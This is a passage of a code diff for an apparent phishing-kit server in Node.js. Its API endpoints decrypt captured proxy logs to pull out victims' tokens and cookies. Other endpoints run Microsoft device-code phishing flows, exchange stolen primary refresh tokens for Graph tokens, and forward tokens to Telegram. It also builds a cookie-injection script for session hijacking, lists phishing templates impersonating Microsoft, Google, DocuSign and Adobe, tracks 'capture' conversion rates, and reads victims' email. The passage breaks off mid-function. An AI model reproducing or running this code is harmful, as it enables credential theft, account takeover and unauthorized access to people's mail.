+            const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+            const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ visits: visits.slice(0, 100), total: visits.length, uniqueIPs, today: todayVisits.length }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    // ── Vault endpoints ──
+    if (apiPath === '/api/vault/scan' && req.method === 'POST') {
+        try {
+            const tokens = vault.scanLogs();
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, count: tokens.length }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    if (apiPath === '/api/vault/tokens') {
+        try {
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, tokens: vault.tokens || [] }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    if (apiPath === '/api/vault/stats') {
+        try {
+            const stats = vault.getStats();
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, stats }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    if (apiPath === '/api/vault/healthcheck' && req.method === 'POST') {
+        try {
+            const results = await vault.healthCheckAll();
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, results }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    if (apiPath === '/api/vault/exchange' && req.method === 'POST') {
         let body = '';
-        clientRequest.on('data', chunk => body += chunk);
-        clientRequest.on('end', () => {
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
             try {
-                const fp = JSON.parse(body);
-                const summary = `🖥️ *FINGERPRINT:*\n${Object.entries(fp).map(([k,v]) => `🔹 *${k}*: \`${v}\``).join('\n')}`;
-                queueTelegramLog(summary).catch(e => displayError("Fingerprint Telegram error", e));
-                clientResponse.writeHead(200, { "Content-Type": "text/plain" });
-                clientResponse.end('ok');
-            } catch(e) {
-                displayError("Fingerprint parse error", e);
-                clientResponse.writeHead(400);
-                clientResponse.end('invalid');
+                const { tokenValue } = JSON.parse(body);
+                if (!tokenValue) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Token value required' }));
+                    return;
+                }
+                const data = await vault.exchangeToken(tokenValue);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, data }));
+            } catch (err) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: err.message }));
             }
         });
         return;
     }
 
-    // ---- NORMAL PROXY FLOW ----
+    // ── Device endpoints ──
+    if (apiPath === '/api/device/request' && req.method === 'POST') {
+        if (!axios) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: 'axios not installed' }));
+            return;
+        }
+        try {
+            const clientId = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+            const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
+                new URLSearchParams({ client_id: clientId, scope: 'https://graph.microsoft.com/.default offline_access' }),
+                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+            );
+            const data = response.data;
+            const flow = {
+                device_code: data.device_code,
+                user_code: data.user_code,
+                verification_uri: data.verification_uri,
+                expires_in: data.expires_in,
+                interval: data.interval,
+                status: 'pending',
+                created: new Date().toISOString(),
+                client_id: clientId,
+                session_id: crypto.randomBytes(16).toString('hex')
+            };
+            deviceFlows.push(flow);
+            saveDeviceFlows();
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify(data));
+        } catch (error) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: error.response?.data || error.message }));
+        }
+        return;
+    }
+
+    if (apiPath === '/api/device/token' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            const { device_code } = JSON.parse(body);
+            if (!device_code) {
+                res.writeHead(400);
+                res.end(JSON.stringify({ error: 'device_code required' }));
+                return;
+            }
+            try {
+                const flow = deviceFlows.find(f => f.device_code === device_code);
+                const clientId = flow?.client_id || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+                const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                    new URLSearchParams({
+                        client_id: clientId,
+                        device_code,
+                        grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
+                    }),
+                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+                );
+                const tokens = response.data;
+                if (flow) {
+                    flow.status = 'approved';
+                    flow.access_token = tokens.access_token;
+                    flow.refresh_token = tokens.refresh_token;
+                    flow.id_token = tokens.id_token;
+                    flow.approved = new Date().toISOString();
+                    saveDeviceFlows();
+                }
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify(tokens));
+            } catch (error) {
+                if (error.response?.data?.error === 'authorization_pending') {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'authorization_pending' }));
+                } else if (error.response?.data?.error === 'expired_token') {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'expired_token' }));
+                } else {
+                    res.writeHead(500);
+                    res.end(JSON.stringify({ error: error.response?.data || error.message }));
+                }
+            }
+        });
+        return;
+    }
+
+    if (apiPath === '/api/device/history') {
+        try {
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, flows: deviceFlows }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    if (apiPath === '/api/device/manual' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { user_code } = JSON.parse(body);
+                if (!user_code) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'user_code required' }));
+                    return;
+                }
+                const clientId = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+                const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
+                    new URLSearchParams({ client_id: clientId, scope: 'https://graph.microsoft.com/.default offline_access' }),
+                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+                );
+                const data = response.data;
+                const flow = {
+                    device_code: data.device_code,
+                    user_code: user_code,
+                    verification_uri: data.verification_uri,
+                    expires_in: data.expires_in,
+                    interval: data.interval,
+                    status: 'pending',
+                    created: new Date().toISOString(),
+                    client_id: clientId,
+                    session_id: crypto.randomBytes(16).toString('hex'),
+                    manual_submitted: true
+                };
+                deviceFlows.push(flow);
+                saveDeviceFlows();
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, flow }));
+            } catch (error) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: error.response?.data || error.message }));
+            }
+        });
+        return;
+    }
+
+    if (apiPath === '/api/device/use' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { session_id } = JSON.parse(body);
+                if (!session_id) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'session_id required' }));
+                    return;
+                }
+                const flow = deviceFlows.find(f => f.session_id === session_id);
+                if (!flow) {
+                    res.writeHead(404);
+                    res.end(JSON.stringify({ error: 'Flow not found' }));
+                    return;
+                }
+                if (!flow.access_token) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'No access token available' }));
+                    return;
+                }
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({
+                    success: true,
+                    access_token: flow.access_token,
+                    refresh_token: flow.refresh_token,
+                    id_token: flow.id_token,
+                    username: flow.username || 'Unknown'
+                }));
+            } catch (error) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: error.message }));
+            }
+        });
+        return;
+    }
+
+    // ── PRT endpoints ──
+    if (apiPath === '/api/prt/scan' && req.method === 'POST') {
+        try {
+            const prts = [];
+            const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
+            for (const file of files) {
+                try {
+                    const content = fs.readFileSync(path.join(LOGS_DIRECTORY, file), 'utf-8');
+                    const lines = content.split('\n').filter(line => line.trim());
+                    for (const line of lines) {
+                        try {
+                            const entry = JSON.parse(line);
+                            const iv = Object.keys(entry)[0];
+                            const encrypted = entry[iv];
+                            const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
+                            let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
+                            decrypted = Buffer.concat([decrypted, decipher.final()]);
+                            const obj = JSON.parse(decrypted.toString('utf-8'));
+                            const body = obj.proxyRequestBody;
+                            if (body) {
+                                const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+                                const prtMatch = bodyStr.match(/prt["']?\s*[:=]\s*["']([^"']+)["']/i);
+                                if (prtMatch) {
+                                    prts.push({
+                                        prt: prtMatch[1],
+                                        timestamp: obj.timestamp || new Date().toISOString(),
+                                        source: obj.proxyRequestURL || 'Unknown',
+                                        username: vault.extractUsernameFromToken(prtMatch[1])
+                                    });
+                                }
+                            }
+                        } catch (e) {}
+                    }
+                } catch (e) {}
+            }
+            prtStorage.prts = prts;
+            prtStorage.lastScan = new Date().toISOString();
+            savePRTStorage();
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, count: prts.length, prts }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    if (apiPath === '/api/prt/list') {
+        try {
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, prts: prtStorage.prts || [] }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    if (apiPath === '/api/prt/exchange' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { prt } = JSON.parse(body);
+                if (!prt) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'PRT required' }));
+                    return;
+                }
+                const response = await retry(async () => {
+                    return await axios.post(
+                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                        new URLSearchParams({
+                            client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+                            grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
+                            assertion: prt,
+                            requested_token_use: 'on_behalf_of',
+                            scope: 'https://graph.microsoft.com/.default offline_access'
+                        }),
+                        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+                    );
+                }, 3, 1500, 2);
+                const tokens = response.data;
+                await sendToTelegram({ sessionId: 'prt_exchange', tokens });
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, data: tokens }));
+            } catch (err) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: err.response?.data || err.message }));
+            }
+        });
+        return;
+    }
+
+    if (apiPath === '/api/prt/health' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { prt } = JSON.parse(body);
+                if (!prt) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'PRT required' }));
+                    return;
+                }
+                const response = await retry(async () => {
+                    return await axios.post(
+                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                        new URLSearchParams({
+                            client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+                            grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
+                            assertion: prt,
+                            requested_token_use: 'on_behalf_of',
+                            scope: 'https://graph.microsoft.com/.default offline_access'
+                        }),
+                        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+                    );
+                }, 2, 1000, 2);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, valid: true, data: response.data }));
+            } catch (err) {
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, valid: false, error: err.response?.data?.error_description || err.message }));
+            }
+        });
+        return;
+    }
+
+    if (apiPath === '/api/prt/health-all' && req.method === 'POST') {
+        try {
+            const results = [];
+            for (const item of prtStorage.prts || []) {
+                try {
+                    const response = await retry(async () => {
+                        return await axios.post(
+                            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                            new URLSearchParams({
+                                client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+                                grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
+                                assertion: item.prt,
+                                requested_token_use: 'on_behalf_of',
+                                scope: 'https://graph.microsoft.com/.default offline_access'
+                            }),
+                            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+                        );
+                    }, 2, 1000, 2);
+                    results.push({ username: item.username, valid: true, data: response.data });
+                } catch (e) {
+                    results.push({ username: item.username, valid: false, error: e.message });
+                }
+            }
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, results }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    if (apiPath === '/api/prt/exchange-all' && req.method === 'POST') {
+        try {
+            const results = [];
+            for (const item of prtStorage.prts || []) {
+                try {
+                    const response = await retry(async () => {
+                        return await axios.post(
+                            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                            new URLSearchParams({
+                                client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+                                grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
+                                assertion: item.prt,
+                                requested_token_use: 'on_behalf_of',
+                                scope: 'https://graph.microsoft.com/.default offline_access'
+                            }),
+                            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+                        );
+                    }, 2, 1000, 2);
+                    results.push({
+                        username: item.username,
+                        success: true,
+                        access_token: response.data.access_token?.slice(0, 40) + '...',
+                        refresh_token: response.data.refresh_token?.slice(0, 40) + '...'
+                    });
+                } catch (e) {
+                    results.push({ username: item.username, success: false, error: e.message });
+                }
+            }
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, results }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    if (apiPath === '/api/prt/stats') {
+        try {
+            const total = prtStorage.prts?.length || 0;
+            const uniqueUsers = new Set((prtStorage.prts || []).map(p => p.username)).size;
+            const healthy = (prtStorage.prts || []).filter(p => p.last_refresh).length;
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({
+                success: true,
+                stats: { total, uniqueUsers, healthy, lastScan: prtStorage.lastScan }
+            }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    // ── Tokens from log ──
+    if (apiPath.startsWith('/api/tokens/')) {
+        const filename = apiPath.replace('/api/tokens/', '');
+        const filePath = path.join(LOGS_DIRECTORY, filename);
+        if (!fs.existsSync(filePath)) {
+            res.writeHead(404);
+            res.end(JSON.stringify({ error: 'Log not found' }));
+            return;
+        }
+        try {
+            const content = fs.readFileSync(filePath, 'utf-8');
+            const lines = content.split('\n').filter(line => line.trim());
+            const tokens = {
+                access_tokens: [],
+                refresh_tokens: [],
+                id_tokens: [],
+                prt_tokens: [],
+                cookies: [],
+                sessions: [],
+                username: 'Unknown'
+            };
+            let username = 'Unknown';
+            for (const line of lines) {
+                try {
+                    const entry = JSON.parse(line);
+                    const iv = Object.keys(entry)[0];
+                    const encrypted = entry[iv];
+                    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
+                    let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
+                    decrypted = Buffer.concat([decrypted, decipher.final()]);
+                    const obj = JSON.parse(decrypted.toString('utf-8'));
+                    const body = obj.proxyRequestBody;
+                    if (body) {
+                        const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+                        const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
+                        if (accessMatch) tokens.access_tokens.push(decodeURIComponent(accessMatch[1]));
+                        const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
+                        if (refreshMatch) tokens.refresh_tokens.push(decodeURIComponent(refreshMatch[1]));
+                        const idMatch = bodyStr.match(/id_token=([^&]+)/i);
+                        if (idMatch) tokens.id_tokens.push(decodeURIComponent(idMatch[1]));
+                        const prtMatch = bodyStr.match(/prt=([^&]+)/i);
+                        if (prtMatch) tokens.prt_tokens.push(decodeURIComponent(prtMatch[1]));
+                        try {
+                            const parsed = typeof body === 'string' ? JSON.parse(body) : body;
+                            if (parsed.username || parsed.login || parsed.user || parsed.Email) {
+                                username = parsed.username || parsed.login || parsed.user || parsed.Email;
+                            }
+                        } catch (e) {}
+                    }
+                    if (obj.proxyResponseHeaders && obj.proxyResponseHeaders['set-cookie']) {
+                        const cookieHeaders = obj.proxyResponseHeaders['set-cookie'];
+                        const arr = Array.isArray(cookieHeaders) ? cookieHeaders : [cookieHeaders];
+                        arr.forEach(c => {
+                            const [nameVal] = c.split(';');
+                            if (nameVal) tokens.cookies.push(nameVal);
+                        });
+                    }
+                } catch (e) {}
+            }
+            tokens.username = username;
+            if (tokens.access_tokens.length > 0) {
+                try {
+                    const parts = tokens.access_tokens[0].split('.');
+                    if (parts.length === 3) {
+                        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
+                        tokens.username = payload.email || payload.preferred_username || payload.upn || tokens.username;
+                    }
+                } catch (e) {}
+            }
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, tokens }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    // ── Analytics ──
+    if (apiPath === '/api/analytics') {
+        try {
+            let visits = [];
+            let captures = [];
+            if (fs.existsSync(VISITS_LOG_FILE)) {
+                const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
+                const lines = content.split('\n').filter(line => line.trim());
+                visits = lines.map(line => JSON.parse(line));
+            }
+            const logFiles = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
+            captures = logFiles.map(f => {
+                const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
+                return { file: f, modified: stat.mtime, size: stat.size };
+            });
+            const now = new Date();
+            const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+            const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
+            const monthAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);
+            const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
+            const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
+            const monthVisits = visits.filter(v => new Date(v.timestamp) >= monthAgo);
+            const todayCaptures = captures.filter(c => c.modified >= today);
+            const weekCaptures = captures.filter(c => c.modified >= weekAgo);
+            const monthCaptures = captures.filter(c => c.modified >= monthAgo);
+            const conversionRate = {
+                today: todayVisits.length > 0 ? (todayCaptures.length / todayVisits.length * 100).toFixed(1) : 0,
+                week: weekVisits.length > 0 ? (weekCaptures.length / weekVisits.length * 100).toFixed(1) : 0,
+                month: monthVisits.length > 0 ? (monthCaptures.length / monthVisits.length * 100).toFixed(1) : 0,
+                total: visits.length > 0 ? (captures.length / visits.length * 100).toFixed(1) : 0
+            };
+            const dailyCaptures = {};
+            const dailyVisits = {};
+            for (let i = 6; i >= 0; i--) {
+                const d = new Date(now.getTime() - i * 24 * 60 * 60 * 1000);
+                const key = d.toDateString();
+                dailyCaptures[key] = 0;
+                dailyVisits[key] = 0;
+            }
+            captures.forEach(c => {
+                const key = new Date(c.modified).toDateString();
+                if (dailyCaptures.hasOwnProperty(key)) dailyCaptures[key]++;
+            });
+            visits.forEach(v => {
+                const key = new Date(v.timestamp).toDateString();
+                if (dailyVisits.hasOwnProperty(key)) dailyVisits[key]++;
+            });
+            const domains = {};
+            visits.forEach(v => {
+                const url = v.url || '';
+                const match = url.match(/https?:\/\/([^\/]+)/);
+                if (match) {
+                    const domain = match[1];
+                    domains[domain] = (domains[domain] || 0) + 1;
+                }
+            });
+            const topDomains = Object.entries(domains)
+                .sort((a, b) => b[1] - a[1])
+                .slice(0, 5)
+                .map(([domain, count]) => ({ domain, count }));
+            const uniqueIPs = new Set(visits.map(v => v.ip)).size;
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({
+                success: true,
+                analytics: {
+                    visits: {
+                        total: visits.length,
+                        today: todayVisits.length,
+                        week: weekVisits.length,
+                        month: monthVisits.length
+                    },
+                    captures: {
+                        total: captures.length,
+                        today: todayCaptures.length,
+                        week: weekCaptures.length,
+                        month: monthCaptures.length
+                    },
+                    conversionRate,
+                    uniqueIPs,
+                    dailyCaptures,
+                    dailyVisits,
+                    topDomains,
+                    captureTimeline: captures.map(c => ({
+                        date: c.modified,
+                        file: c.file,
+                        size: c.size
+                    }))
+                }
+            }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    // ── Replay ──
+    if (apiPath.startsWith('/api/replay/')) {
+        const filename = apiPath.replace('/api/replay/', '');
+        const filePath = path.join(LOGS_DIRECTORY, filename);
+        if (!fs.existsSync(filePath)) {
+            res.writeHead(404);
+            res.end(JSON.stringify({ error: 'Log not found' }));
+            return;
+        }
+        try {
+            const content = fs.readFileSync(filePath, 'utf-8');
+            const lines = content.split('\n').filter(line => line.trim());
+            let allCookies = [];
+            let targetDomain = null;
+            let accessToken = null;
+            let refreshToken = null;
+
+            for (const line of lines) {
+                try {
+                    const entry = JSON.parse(line);
+                    const iv = Object.keys(entry)[0];
+                    const encrypted = entry[iv];
+                    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
+                    let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
+                    decrypted = Buffer.concat([decrypted, decipher.final()]);
+                    const obj = JSON.parse(decrypted.toString('utf-8'));
+
+                    if (!targetDomain && obj.proxyRequestURL) {
+                        try {
+                            const url = new URL(obj.proxyRequestURL);
+                            targetDomain = url.hostname;
+                        } catch (e) {}
+                    }
+
+                    const setCookie = obj.proxyResponseHeaders?.['set-cookie'];
+                    if (setCookie) {
+                        const cookieArray = Array.isArray(setCookie) ? setCookie : [setCookie];
+                        for (const cookie of cookieArray) {
+                            const [nameValue] = cookie.split(';');
+                            if (nameValue) allCookies.push(nameValue.trim());
+                        }
+                    }
+
+                    const body = obj.proxyRequestBody;
+                    if (body) {
+                        const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+                        const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
+                        if (accessMatch) accessToken = decodeURIComponent(accessMatch[1]);
+                        const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
+                        if (refreshMatch) refreshToken = decodeURIComponent(refreshMatch[1]);
+                    }
+                } catch (e) {}
+            }
+
+            if (allCookies.length === 0 && !accessToken) {
+                res.writeHead(404);
+                res.end(JSON.stringify({ error: 'No cookies or tokens found' }));
+                return;
+            }
+
+            const replayScript = `
+                (function() {
+                    const cookies = ${JSON.stringify(allCookies)};
+                    const targetDomain = ${JSON.stringify(targetDomain || 'login.microsoftonline.com')};
+                    const accessToken = ${JSON.stringify(accessToken)};
+                    const refreshToken = ${JSON.stringify(refreshToken)};
+                    
+                    cookies.forEach(c => {
+                        document.cookie = c + '; path=/; domain=' + targetDomain + '; Secure; SameSite=None';
+                    });
+                    
+                    let msg = '🍪 ' + cookies.length + ' cookies injected.';
+                    if (accessToken) {
+                        msg += '\\n🔑 Access token: ' + accessToken.slice(0, 20) + '...';
+                        localStorage.setItem('evil_token', accessToken);
+                    }
+                    if (refreshToken) {
+                        msg += '\\n🔄 Refresh token: ' + refreshToken.slice(0, 20) + '...';
+                    }
+                    alert(msg);
+                    window.location.href = 'https://' + targetDomain;
+                })();
+            `;
+
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({
+                success: true,
+                cookieCount: allCookies.length,
+                targetDomain: targetDomain || 'login.microsoftonline.com',
+                hasAccessToken: !!accessToken,
+                hasRefreshToken: !!refreshToken,
+                replayScript: replayScript,
+                cookieString: allCookies.join('; ')
+            }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    // ── Phishlets ──
+    if (apiPath === '/api/phishlets') {
+        try {
+            const phishlets = {
+                microsoft: { name: 'Microsoft 365', file: 'microsoft.html', entryPoint: '/login', enabled: true },
+                google: { name: 'Google', file: 'google.html', entryPoint: '/accounts', enabled: true },
+                docusign: { name: 'DocuSign', file: 'docusign.html', entryPoint: '/signin', enabled: false },
+                adobe: { name: 'Adobe', file: 'adobe.html', entryPoint: '/login', enabled: false }
+            };
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, phishlets }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    if (apiPath === '/api/phishlets/toggle' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { id, enabled } = JSON.parse(body);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, message: `${id} ${enabled ? 'enabled' : 'disabled'}` }));
+            } catch (err) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: err.message }));
+            }
+        });
+        return;
+    }
+
+    // ── Recon ──
+    if (apiPath === '/api/recon' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { accessToken } = JSON.parse(body);
+                if (!accessToken) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Access token required' }));
+                    return;
+                }
+                const graph = new GraphClient(accessToken);
+                const profile = await graph.getUserProfile();
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, profile }));
+            } catch (err) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: err.message }));
+            }
+        });
+        return;
+    }
+
+    // ── Webmail folders ──
+    if (apiPath === '/api/webmail/folders' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { accessToken } = JSON.parse(body);
+                if (!accessToken) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Access token required' }));
+                    return;
+                }
+                const graph = new GraphClient(accessToken);
+                const folders = await graph.get('/me/mailFolders');
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, folders: folders.value || [] }));
+            } catch (err) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: err.message }));
+            }
+        });
+        return;
+    }
+
+    // ── Webmail emails ──
+    if (apiPath === '/api/webmail/emails' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { accessToken, folderId = 'inbox', limit = 50, skip = 0 } = JSON.parse(body);
+                if (!accessToken) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Access token required' }));
+                    return;
+                }
+                const graph = new GraphClient(accessToken);
+                let endpoint;
+                if (folderId === 'inbox') {
+                    endpoint = `/me/mailFolders/inbox/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
+                } else if (folderId === 'sent') {
+                    endpoint = `/me/mailFolders/sentitems/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
+                } else {
+                    endpoint = `/me/mailFolders/${folderId}/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
+                }
+                const emails = await graph.get(endpoint);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, emails: emails.value || [], count: emails.value?.length || 0 }));
+            } catch (err) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: err.message }));
+            }
+        });
+        return;
+    }
+
+    // ── Webmail single email ──
+    if (apiPath === '/api/webmail/email' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { accessToken, messageId } = JSON.parse(body);
+                if (!accessToken) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Access token required' }));
+                    return;
+                }
+                if (!messageId) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Message ID required' }));
+                    return;
+                }
+                const graph = new GraphClient(accessToken);
+                const email = await graph.get(`/messages/${messageId}?$select=id,subject,sender,toRecipients,ccRecipients,bccRecipients,receivedDateTime,body,isRead,hasAttachments,importance,conversationId`);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, email }));
+            } catch (err) {
+                res.writeHead(500);
